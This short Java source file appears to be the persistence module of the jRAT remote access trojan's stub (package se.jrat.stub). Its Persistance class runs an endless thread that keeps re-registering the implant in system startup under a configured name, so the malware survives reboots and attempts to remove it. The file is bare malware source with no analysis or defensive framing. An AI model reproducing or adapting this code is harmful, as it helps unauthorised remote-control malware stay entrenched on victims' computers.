package se.jrat.stub;

import startuplib.Startup;

public class Persistance extends Thread {

	private int ms;

	public Persistance(int ms) {
		super("p");
		this.ms = ms;
	}

	public void run() {
		while (true) {
			try {
				Startup.add(Configuration.name);

				Thread.sleep(ms);
			} catch (Exception ex) {
				ex.printStackTrace();
				break;
			}
		}
	}

}
